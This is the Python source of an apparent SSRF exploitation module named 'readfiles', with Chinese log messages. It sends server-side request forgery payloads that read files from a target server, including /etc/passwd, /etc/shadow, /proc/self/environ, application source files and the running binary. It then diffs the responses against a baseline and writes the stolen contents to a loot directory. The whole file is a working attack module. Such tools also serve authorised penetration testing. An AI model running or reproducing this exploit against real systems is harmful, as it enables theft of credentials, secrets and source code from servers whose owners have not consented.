import logging

from core.utils import *

name = "readfiles"
description = "读取目标上的文件"
author = "Swissky"
documentation = []


class exploit:
    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        if hasattr(args, "targetfiles") and isinstance(args.targetfiles, str):
            self.files = args.targetfiles.split(",")
        else:
            self.files = [
                "/etc/passwd",
                "/etc/lsb-release",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/passwd",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/proc/self/cwd/index.php",
                "/proc/self/cwd/application.py",
                "/proc/self/cwd/main.py",
                "/proc/self/exe",
            ]
        self.file_magic = {"elf": bytes([0x7F, 0x45, 0x4C, 0x46])}

        r = requester.do_request(args.param, "")

        if r is not None:
            default = r.text

            for remote_file in self.files:
                r = requester.do_request(args.param, wrapper_file(remote_file))
                diff = diff_text(r.text, default)
                if diff != "":
                    # 显示默认请求与 SSRF 请求之间的差异
                    logging.info(f"\033[32m读取文件\033[0m : {remote_file}")
                    if bytes(diff, encoding="utf-8").startswith(self.file_magic["elf"]):
                        logging.info("发现 ELF 二进制文件 - 不输出到终端")
                    else:
                        logging.info(diff)

                    # 将差异写入文件
                    output_path = loot_path(requester.host, remote_file)
                    logging.info(f"\033[32m写入文件\033[0m : {remote_file} 到 {output_path}")
                    output_path.write_text(diff, encoding="utf-8")

        else:
            logging.info("响应为空")
